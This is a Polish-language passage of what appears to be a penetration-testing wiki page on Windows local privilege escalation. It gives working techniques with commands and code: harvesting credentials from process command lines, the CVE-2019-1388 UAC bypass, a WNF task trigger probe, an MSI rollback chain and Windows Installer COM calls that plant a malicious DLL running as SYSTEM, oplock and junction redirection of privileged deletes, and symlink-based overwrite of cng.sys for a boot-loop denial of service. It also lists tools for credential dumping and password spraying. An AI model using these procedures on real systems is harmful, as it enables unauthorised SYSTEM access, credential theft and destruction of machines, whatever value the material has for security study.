Po uzyskaniu shell jako użytkownik mogą być uruchamiane zaplanowane zadania lub inne procesy, które **przekazują dane uwierzytelniające w wierszu poleceń**. Poniższy skrypt co dwie sekundy zapisuje wiersze poleceń procesów i porównuje bieżący stan z poprzednim, wyświetlając wszelkie różnice.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Wykradanie haseł z procesów

## Od użytkownika z niskimi uprawnieniami do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (przez konsolę lub RDP), a funkcja UAC jest włączona, w niektórych wersjach systemu Microsoft Windows można uruchomić terminal lub dowolny inny proces, taki jak „NT\AUTHORITY SYSTEM”, z poziomu nieuprzywilejowanego użytkownika.

Dzięki tej samej podatności można jednocześnie eskalować uprawnienia i ominąć UAC. Dodatkowo nie trzeba niczego instalować, a plik binarny używany w tym procesie jest podpisany i wydany przez firmę Microsoft.

Niektóre z podatnych systemów to:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Aby wykorzystać tę podatność, należy wykonać następujące kroki:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Masz wszystkie niezbędne pliki i informacje w tym repozytorium GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od poziomu Administratora o średnim poziomie integralności do wysokiego poziomu integralności / UAC Bypass

Przeczytaj to, aby **dowiedzieć się o poziomach integralności**:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie **przeczytaj to, aby dowiedzieć się o UAC i UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Przekierowanie katalogu przesyłania do katalogu głównego serwowanego przez serwer

Aplikacja może utworzyć przewidywalny podkatalog do przesyłania plików, zapisać w nim plik o nazwie podanej przez użytkownika, a następnie go przetworzyć. Jeśli użytkownik o niskich uprawnieniach może usunąć ten podkatalog i zastąpić go junction NTFS przed zapisem po stronie serwera, zapis może zostać przekierowany przez junction do katalogu serwowanego przez serwer WWW. Umieszczony tam skrypt może zostać uruchomiony z tożsamością usługi WWW, jeśli serwer wykonuje pliki tego typu. To granica arbitralnego zapisu zależna od konkretnej aplikacji; sam fakt, że katalog przesyłania jest zapisywalny lub że istnieje junction, nie stanowi na to dowodu.

Sprawdź dokładny sposób konstruowania ścieżki i moment zapisu w procedurze obsługi przesyłania, efektywne uprawnienia użytkownika do usuwania i tworzenia podkatalogu, efektywne ACL katalogu docelowego, to, czy proces zapisujący podąża za punktami ponownej analizy, oraz to, czy serwer WWW wykonuje pliki w tym katalogu docelowym. Osobno potwierdź tożsamości procesów zapisującego i serwera WWW. Pasywna inwentaryzacja może wykazać ACL katalogów i metadane reparse, ale nie pozwala ustalić zachowania procedury obsługi ani tego, czy w przyszłości nastąpi podmiana junction. Jeśli plik zostanie wykonany w kontekście konta usługi, przed rozważeniem odrębnej ścieżki wykorzystującej uprawnienia tokenu sprawdź **rzeczywisty token procesu**.

## Czyszczenie zaplanowanego zadania z uprawnieniami podwyższonymi, wyzwalane przez WNF

Zaplanowane zadanie, które blokuje ręczne uruchomienie, może mimo to udostępniać nieuprzywilejowany mechanizm wyzwalający. Podczas audytu zadania z uprawnieniami podwyższonymi wyeksportuj jego XML i sprawdź **wszystkie** wyzwalacze, a także DACL zadania, podmiot i akcję. W szczególności `WnfStateChangeTrigger` wskazuje stan Windows Notification Facility (WNF); jeśli bieżący użytkownik ma uprawnienia do publikowania aktualizacji tego zabezpieczonego stanu, może pośrednio uruchomić zadanie z skonfigurowaną tożsamością, mimo ustawienia `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Na przykład zadanie Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` działało jako SYSTEM, akceptowało od standardowego użytkownika aktualizacje stanu WNF `7508BCA32C079E41`, a następnie sprawdzało `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, nawet gdy Recall było wyłączone.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Aby przetestować osiągalność, rozwiąż `ZwUpdateWnfStateData` z `ntdll.dll`, prześlij pustą aktualizację dla ośmiobajtowej nazwy stanu i zestaw zwrócony status z danymi o ostatnim uruchomieniu zadania lub aktywnością w Procmon. Poniższa uproszczona sonda używa sekwencji bajtów z przykładu zadania Recall; zastąp ją bajtami wyeksportowanymi dla testowanego zadania.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Przekształcenie rekurencyjnego czyszczenia w uprzywilejowane usuwanie

Przydatnym prymitywem nie jest sam trigger, lecz uprzywilejowana procedura czyszczenia, która przyjmuje katalog kontrolowany przez atakującego. Prześledź operację od enumeracji do końcowej modyfikacji: wykrywanie profili/sesji, wybieranie elementów potomnych za pomocą wildcarda, `SHCreateItemFromParsingName` i `IFileOperation::DeleteItem` to mocne przesłanki, że wcześniej sprawdzona ścieżka zostanie później przetworzona rekurencyjnie. Jeśli elementy potomne nie są otwierane względem zaufanych uchwytów katalogów i weryfikowane przed usunięciem, atakujący może zmienić sposób rozwiązywania ścieżki między enumeracją a użyciem.<sup>[[43]](#references)</sup>

Połącz trigger WNF z opisanym poniżej [podstawieniem oplock, junction i symlinka Object Manager](#from-folder-contents-delete-to-system-eop): oplock wstrzymuje proces czyszczenia po wybraniu legalnego elementu potomnego, a następnie zapisywalny katalog nadrzędny zostaje podmieniony, tak aby wznowione uprzywilejowane usuwanie rozwiązało ścieżkę przez `\RPC Control` do chronionego celu. W łańcuchu Recall umożliwiło to usunięcie przez SYSTEM `C:\Config.Msi`, wymagane przez opisaną technikę rollbacku MSI.<sup>[[31]](#references)[[43]](#references)</sup>

### Zagnieżdżone elementy potomne omijają płytkie poprawki dotyczące reparse pointów

Sama weryfikacja katalogu kontrolowanego przez atakującego i jego bezpośredniego elementu potomnego nie zabezpiecza rekurencyjnego usuwania opartego na ścieżkach. Pozostaw te sprawdzone obiekty bez zmian, a podstawienie junction/oplock przenieś do kolejnego elementu potomnego; `IFileOperation::DeleteItem` ostatecznie dotrze do nieweryfikowanego elementu potomnego i podąży za jego nowym celem. CVE-2026-20941 powstało właśnie w wyniku takiej niekompletnej poprawki: pierwsza poprawka Recall weryfikowała `UKP` i katalog o nazwie w formacie GUID, ale pozostawiała starą operację rekurencyjnego usuwania.<sup>[[43]](#references)</sup>

Bezpieczny wzorzec polega na otwieraniu **każdego elementu potomnego** względem już zaufanego uchwytu katalogu, pobraniu i zweryfikowaniu ostatecznej rozwiązanej ścieżki/obiektu oraz zastosowaniu dyspozycji usunięcia do zweryfikowanego uchwytu. Nie weryfikuj prefiksu, a następnie nie wracaj do rekurencyjnego usuwania opartego na ścieżce. Podczas przeglądu poprawek sprawdzaj również struktury w rzeczywistym miejscu wywołania: w tym przypadku inspekcja działania programu wykazała, że `OBJECT_ATTRIBUTES` w `NtCreateFile` zawierało niepusty `RootDirectory` i względną nazwę `{GUID}\\secure_file.lock`, co obaliło mylący wynik dekompilacji sugerujący istnienie drugiego prymitywu `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Od dowolnego usuwania/przenoszenia/zmiany nazwy folderu do SYSTEM EoP

Technika opisana [**w tym wpisie na blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), wraz z kodem exploita [**dostępnym tutaj**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Atak polega zasadniczo na wykorzystaniu funkcji rollbacku Windows Installer do zastąpienia legalnych plików złośliwymi podczas procesu odinstalowywania. W tym celu atakujący musi utworzyć **złośliwy instalator MSI**, który posłuży do przejęcia folderu `C:\Config.Msi`. Windows Installer użyje go później do przechowywania plików rollbacku podczas odinstalowywania innych pakietów MSI; pliki rollbacku zostaną wcześniej zmodyfikowane tak, aby zawierały złośliwy payload.

### Wstrzyknięcie ścieżki czyszczenia COM usługi Windows Installer (CVE-2025-27727)

Klient z niskimi uprawnieniami może uzyskać dostęp do usługi SYSTEM `msiexec.exe` za pośrednictwem obiektu COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Inżynieria wsteczna pozwoliła zidentyfikować odpowiednie wywołania `IMsiServer`: `MsiBeginTransactionW` pod offsetem vtable `0xA0`, `SetEEUIDirectoryAndFilter` pod `0xC8` oraz `CleanupTempPackages` pod `0x50`. Nazwy i offsety pochodzą z inżynierii wstecznej i mogą się różnić w zależności od kompilacji.<sup>[[41]](#references)</sup>

W przypadku użytkownika niebędącego administratorem `SetEEUIDirectoryAndFilter` podszywa się pod wywołującego tylko podczas otwierania podanej ścieżki z uprawnieniem `DELETE` oraz flagami `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Dowodzi to, że wywołujący może usunąć katalog, i zapobiega podążaniu za reparse pointem, ale **nie** wiąże sprawdzonego obiektu pliku z późniejszym czyszczeniem ani nie dowodzi, że utworzył go Windows Installer.<sup>[[41]](#references)</sup>

Po `MsiBeginTransactionW` funkcja `SetEEUIDirectoryAndFilter` planuje ścieżkę jako folder, niezależnie od argumentu filtra przekazanego przez wywołującego. Usługa zapisuje nazwaną wartość `REG_DWORD` w `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: nazwa wartości to ścieżka kontrolowana przez wywołującego, a dane `0x00000002` oznaczają flagę folderu. Następnie `CleanupTempPackages(NULL, FALSE)` bezpośrednio uruchamia czyszczenie. Podwyższony worker enumeruje wartości rejestru i przekazuje wpisy folderów do rekurencyjnej funkcji `FDeleteFolder` bez sprawdzania pochodzenia ścieżki. Jeśli zwykłe usunięcie się nie powiedzie, kod wywołuje również `LockdownPath`, czyści atrybuty pliku i ponawia próbę.<sup>[[41]](#references)</sup>

Minimalna sekwencja wywołań odtworzona z `msi.dll`:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Użytecznym prymitywem jest ponowne użycie ścieżki, a nie przekierowanie przez junction. Zarejestruj utworzony przez atakującego katalog `C:\Config.Msi`, usuń go i pozwól Windows Installer później odtworzyć tę samą ścieżkę z chronionymi danymi rollback. Procedura czyszczenia ufa nieaktualnej nazwie `TempPackages` i usuwa nowy katalog jako SYSTEM. Omija to zamierzoną ochronę zapewnianą przez `FILE_FLAG_OPEN_REPARSE_POINT` i mechanizm ograniczający zaufanie do przekierowań, ponieważ nie jest wymagany żaden reparse point.<sup>[[41]](#references)</sup>

Ten prymityw usuwania pasuje do opisanego niżej łańcucha rollback: zachowaj oddzielny wpis `Installer\Folders`, usuń chroniony katalog `C:\Config.Msi`, odtwórz go z NULL DACL i zachowaj uchwyt z uprawnieniem `WRITE_DAC` otwarty przed zaostrzeniem DACL przez instalator. Wcześniej otwarty uchwyt może przywrócić permisywną DACL za pomocą `NtSetSecurityObject`, po czym wygenerowany plik `.rbs` można podmienić, zanim rollback zostanie wznowiony.<sup>[[41]](#references)</sup>

Microsoft naprawił tę ścieżkę, uniemożliwiając `CMsiTransaction::SetEEUIDirectoryAndFilter` wywołanie `ScheduleFileOrFolderDelete`, gdy włączona jest nowa bramka funkcji. Wywołanie COM nadal może zwrócić sukces, ale ścieżka kontrolowana przez atakującego nie trafia już do `TempPackages`. Zastosuj aktualizacje zabezpieczeń Windows z kwietnia 2025 r. — nie traktuj pomyślnego zwrotu metody jako testu poprawności poprawki.<sup>[[41]](#references)[[42]](#references)</sup>

Podsumowanie techniki:

1. **Etap 1 – Przygotowanie do przejęcia (pozostaw pusty katalog `C:\Config.Msi`)**

- Krok 1: Zainstaluj MSI
    - Utwórz plik `.msi`, który instaluje nieszkodliwy plik (np. `dummy.txt`) w zapisywalnym folderze (`TARGETDIR`).
    - Oznacz instalator jako **„UAC Compliant”**, aby **użytkownik bez uprawnień administratora** mógł go uruchomić.
    - Po instalacji pozostaw otwarty **uchwyt** do pliku.

- Krok 2: Rozpocznij odinstalowywanie
    - Odinstaluj ten sam plik `.msi`.
    - Proces odinstalowywania zaczyna przenosić pliki do `C:\Config.Msi` i zmieniać ich nazwy na pliki `.rbf` (kopie zapasowe rollback).
    - **Odpytyj otwarty uchwyt pliku** za pomocą `GetFinalPathNameByHandle`, aby wykryć, kiedy plik zmieni ścieżkę na `C:\Config.Msi\<random>.rbf`.

- Krok 3: Synchronizacja niestandardowa
    - Plik `.msi` zawiera **niestandardową akcję odinstalowywania (`SyncOnRbfWritten`)**, która:
        - Sygnalizuje zapisanie pliku `.rbf`.
        - Następnie **czeka** na inne zdarzenie przed kontynuowaniem odinstalowywania.

- Krok 4: Zablokuj usunięcie pliku `.rbf`
    - Po otrzymaniu sygnału **otwórz plik `.rbf`** bez `FILE_SHARE_DELETE` — **uniemożliwi to jego usunięcie**.
    - Następnie **odeślij sygnał**, aby odinstalowywanie mogło się zakończyć.
    - Windows Installer nie może usunąć pliku `.rbf`, a ponieważ nie może usunąć całej zawartości, **katalog `C:\Config.Msi` nie zostaje usunięty**.

- Krok 5: Ręcznie usuń plik `.rbf`
    - Ty (atakujący) ręcznie usuwasz plik `.rbf`.
    - Teraz **katalog `C:\Config.Msi` jest pusty** i gotowy do przejęcia.

> W tym momencie **uruchom podatność umożliwiającą usunięcie dowolnego folderu na poziomie SYSTEM**, aby usunąć `C:\Config.Msi`.

2. **Etap 2 – Podmiana skryptów rollback na złośliwe**

- Krok 6: Odtwórz `C:\Config.Msi` ze słabymi ACL
    - Samodzielnie odtwórz folder `C:\Config.Msi`.
    - Ustaw **słabe DACL** (np. Everyone:F) i **pozostaw otwarty uchwyt** z uprawnieniem `WRITE_DAC`.

- Krok 7: Uruchom kolejną instalację
    - Ponownie zainstaluj plik `.msi`, podając:
        - `TARGETDIR`: zapisywalną lokalizację.
        - `ERROROUT`: zmienną, która powoduje wymuszone niepowodzenie.
    - Ta instalacja posłuży do ponownego uruchomienia **rollback**, który odczytuje pliki `.rbs` i `.rbf`.

- Krok 8: Monitoruj pojawienie się pliku `.rbs`
    - Użyj `ReadDirectoryChangesW`, aby monitorować `C:\Config.Msi` do momentu pojawienia się nowego pliku `.rbs`.
    - Zapisz jego nazwę.

- Krok 9: Synchronizuj przed rollback
    - Plik `.msi` zawiera **niestandardową akcję instalacji (`SyncBeforeRollback`)**, która:
        - Sygnalizuje zdarzenie po utworzeniu pliku `.rbs`.
        - Następnie **czeka** przed kontynuowaniem.

- Krok 10: Ponownie ustaw słabe ACL
    - Po odebraniu zdarzenia `rbs created`:
        - Windows Installer **ponownie ustawia silne ACL** dla `C:\Config.Msi`.
        - Ponieważ nadal masz uchwyt z uprawnieniem `WRITE_DAC`, możesz **ponownie ustawić słabe ACL**.

> ACL są **sprawdzane tylko przy otwieraniu uchwytu**, więc nadal możesz zapisywać w folderze.

- Krok 11: Umieść fałszywe pliki `.rbs` i `.rbf`
    - Nadpisz plik `.rbs` **fałszywym skryptem rollback**, który każe Windows:
        - Przywrócić plik `.rbf` (złośliwą bibliotekę DLL) do **uprzywilejowanej lokalizacji** (np. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Umieść fałszywy plik `.rbf` zawierający **złośliwy payload DLL działający na poziomie SYSTEM**.

- Krok 12: Uruchom rollback
    - Zasygnalizuj zdarzenie synchronizacyjne, aby instalator wznowił działanie.
    - Skonfigurowano **niestandardową akcję typu 19 (`ErrorOut`)**, która **celowo kończy instalację błędem** w znanym punkcie.
    - Powoduje to rozpoczęcie **rollback**.

- Krok 13: SYSTEM instaluje Twoją bibliotekę DLL
    - Windows Installer:
        - Odczytuje złośliwy plik `.rbs`.
        - Kopiuje bibliotekę DLL z pliku `.rbf` do docelowej lokalizacji.
    - Teraz masz **złośliwą bibliotekę DLL w ścieżce, z której ładuje ją SYSTEM**.

- Ostatni krok: Wykonaj kod jako SYSTEM
    - Uruchom zaufany **automatycznie podwyższający uprawnienia plik binarny** (np. `osk.exe`), który ładuje przejętą przez Ciebie bibliotekę DLL.
    - **Gotowe**: Twój kod zostanie wykonany **jako SYSTEM**.


### Od usuwania/przenoszenia/zmiany nazwy dowolnego pliku do SYSTEM EoP

Główna technika MSI rollback (opisana wcześniej) zakłada, że możesz usunąć **cały folder** (np. `C:\Config.Msi`). Ale co, jeśli podatność umożliwia tylko **usuwanie dowolnych plików**?

Możesz wykorzystać **wewnętrzne mechanizmy NTFS**: każdy folder ma ukryty alternatywny strumień danych o nazwie:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ten strumień przechowuje **metadane indeksu** folderu.

Dlatego jeśli **usuniesz strumień `::$INDEX_ALLOCATION`** folderu, NTFS **usuwa cały folder** z systemu plików.

Możesz to zrobić za pomocą standardowych interfejsów API do usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Mimo że wywołujesz API usuwania *pliku*, **usuwa ono sam folder**.

### Od usuwania zawartości folderu do SYSTEM EoP
Co jeśli Twoja prymitywa nie pozwala usuwać dowolnych plików/folderów, ale **pozwala usuwać *zawartość* folderu kontrolowanego przez atakującego**?

1. Krok 1: Przygotuj folder-przynętę i plik
- Utwórz: `C:\temp\folder1`
- Wewnątrz utwórz: `C:\temp\folder1\file1.txt`

2. Krok 2: Ustaw **oplock** na `file1.txt`
- Oplock **wstrzymuje wykonanie**, gdy uprzywilejowany proces próbuje usunąć `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Krok 3: Uruchom proces SYSTEM (np. `SilentCleanup`)
- Ten proces skanuje foldery (np. `%TEMP%`) i próbuje usunąć ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock zostaje wyzwolony** i przekazuje kontrolę do Twojego callbacka.

4. Krok 4: W callbacku oplock — przekieruj usuwanie

- Opcja A: Przenieś `file1.txt` w inne miejsce
    - Spowoduje to opróżnienie `folder1` bez przerywania działania oplock.
    - Nie usuwaj bezpośrednio `file1.txt` — spowodowałoby to przedwczesne zwolnienie oplock.

- Opcja B: Zamień `folder1` na **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Atakowany jest wewnętrzny strumień NTFS przechowujący metadane folderu — jego usunięcie usuwa folder.

5. Krok 5: Zwolnij oplock
- Proces SYSTEM działa dalej i próbuje usunąć `file1.txt`.
- Jednak teraz, z powodu junction + symlink, w rzeczywistości usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Wynik**: `C:\Config.Msi` zostaje usunięty przez SYSTEM.

### Od tworzenia dowolnych folderów do permanentnego DoS

Wykorzystaj prymityw umożliwiający **utworzenie dowolnego folderu jako SYSTEM/admin** — nawet jeśli **nie możesz zapisywać plików** ani **ustawiać słabych uprawnień**.

Utwórz **folder** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```

- Ta ścieżka zwykle odpowiada sterownikowi trybu jądra `cng.sys`.
- Jeśli **utworzysz wcześniej tę ścieżkę jako folder**, Windows nie załaduje właściwego sterownika podczas uruchamiania.
- Następnie Windows próbuje załadować `cng.sys` podczas uruchamiania.
- Widzi folder, **nie może odnaleźć właściwego sterownika** i **ulega awarii lub zatrzymuje proces uruchamiania**.
- **Nie ma mechanizmu awaryjnego** ani **możliwości odzyskania systemu** bez zewnętrznej interwencji (np. naprawy rozruchu lub dostępu do dysku).

### Od uprzywilejowanych ścieżek logów/kopii zapasowych + dowiązań symbolicznych OM do arbitrary file overwrite / boot DoS

Gdy **uprzywilejowana usługa** zapisuje logi/eksporty w ścieżce odczytanej z **zapisywalnej konfiguracji**, przekieruj tę ścieżkę za pomocą **dowiązań symbolicznych Object Manager + punktów instalacji NTFS**, aby zamienić uprzywilejowany zapis w arbitrary overwrite (nawet **bez SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Wymagania**
- Konfiguracja przechowująca ścieżkę docelową jest zapisywalna przez atakującego (np. `%ProgramData%\...\.ini`).
- Możliwość utworzenia punktu instalacji do `\RPC Control` i dowiązania symbolicznego pliku OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Uprzywilejowana operacja zapisująca w tej ścieżce (log, eksport, raport).

**Przykładowy łańcuch**
1. Odczytaj konfigurację, aby ustalić uprzywilejowaną ścieżkę logu, np. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` w `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Przekieruj ścieżkę bez uprawnień administratora:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Poczekaj, aż uprzywilejowany komponent zapisze log (np. administrator wybierze „wyślij testowy SMS”). Zapis trafi teraz do `C:\Windows\System32\cng.sys`.
4. Sprawdź nadpisany plik docelowy (parserem hex/PE), aby potwierdzić uszkodzenie; ponowne uruchomienie wymusi załadowanie przez Windows zmodyfikowanej ścieżki sterownika → **DoS w postaci pętli rozruchowej**. To samo dotyczy każdego chronionego pliku, który uprzywilejowana usługa otworzy do zapisu.

> `cng.sys` jest zwykle ładowany z `C:\Windows\System32\drivers\cng.sys`, ale jeśli jego kopia znajduje się w `C:\Windows\System32\cng.sys`, może zostać załadowana jako pierwsza, co czyni ją niezawodnym celem DoS dla uszkodzonych danych.



## **Od High Integrity do System**

### **Nowa usługa**

Jeśli proces działa już na poziomie High Integrity, **ścieżka do SYSTEM** może być prosta — wystarczy **utworzyć i uruchomić nową usługę**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Podczas tworzenia binarnego pliku usługi upewnij się, że jest prawidłową usługą albo że plik binarny szybko wykonuje niezbędne działania, ponieważ zostanie zakończony po 20 s, jeśli nie będzie prawidłową usługą.

### AlwaysInstallElevated

Z procesu o wysokim poziomie integralności możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell za pomocą wrappera _**.msi**_.\
[Więcej informacji o kluczach rejestru oraz o instalowaniu pakietu _.msi_ znajdziesz tutaj.](#alwaysinstallelevated)

### Wysoki poziom integralności + uprawnienie SeImpersonate do System

**Możesz** [**znaleźć kod tutaj**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do uprawnień Full Token

Jeśli masz te uprawnienia tokenu (prawdopodobnie znajdziesz je w procesie o wysokim poziomie integralności), możesz **otworzyć niemal dowolny proces** (z wyjątkiem procesów chronionych) za pomocą uprawnienia SeDebug, **skopiować token** procesu i utworzyć **dowolny proces z tym tokenem**.\
Ta technika polega zwykle na **wybraniu dowolnego procesu działającego jako SYSTEM ze wszystkimi uprawnieniami tokenu** (_tak, można znaleźć procesy SYSTEM bez wszystkich uprawnień tokenu_).\
**Przykład kodu wykonującego opisaną technikę znajdziesz** [**tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Tej techniki używa meterpreter do eskalacji uprawnień w `getsystem`. Polega ona na **utworzeniu potoku, a następnie utworzeniu lub nadużyciu usługi, aby zapisywała do tego potoku**. Następnie **serwer**, który utworzył potok przy użyciu uprawnienia **`SeImpersonate`**, będzie mógł **podszyć się pod token** klienta potoku (usługi), uzyskując uprawnienia SYSTEM.\
Jeśli chcesz [**dowiedzieć się więcej o potokach nazwanych, przeczytaj ten materiał**](#named-pipe-client-impersonation).\
Jeśli chcesz zobaczyć przykład [**przejścia od wysokiego poziomu integralności do System przy użyciu potoków nazwanych, przeczytaj ten materiał**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda ci się **przejąć bibliotekę dll** **ładowaną** przez **proces** działający jako **SYSTEM**, będziesz móc wykonać dowolny kod z tymi uprawnieniami. Dlatego Dll Hijacking przydaje się również do tego rodzaju eskalacji uprawnień; ponadto jest **znacznie łatwiejszy do przeprowadzenia z procesu o wysokim poziomie integralności**, ponieważ taki proces ma **uprawnienia do zapisu** w folderach używanych do ładowania bibliotek dll.\
**Możesz** [**dowiedzieć się więcej o Dll hijacking tutaj**](dll-hijacking/index.html)**.**

### **Od Administrator lub Network Service do System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE lub NETWORK SERVICE do pełnych uprawnień

**Przeczytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Więcej pomocy

[Statyczne pliki binarne impacket](https://github.com/ropnop/impacket_static_binaries)

## Przydatne narzędzia

**Najlepsze narzędzie do wyszukiwania wektorów lokalnej eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sprawdza błędne konfiguracje i wrażliwe pliki (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wykryto.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sprawdza niektóre możliwe błędne konfiguracje i zbiera informacje (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sprawdza błędne konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Wyodrębnia zapisane informacje o sesjach PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Użyj opcji -Thorough lokalnie.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Wyodrębnia poświadczenia z Credential Manager. Wykryto.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Wykonuje spray zebranych haseł w całej domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to narzędzie PowerShell do spoofingu ADIDNS/LLMNR/mDNS i ataków man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowa enumeracja Windows pod kątem privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Wyszukuje znane podatności privesc (PRZESTARZAŁE, zastąpione przez Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Kontrole lokalne **(wymagane uprawnienia administratora)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Wyszukuje znane podatności privesc (wymaga kompilacji za pomocą VisualStudio) ([**skompilowana wersja**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
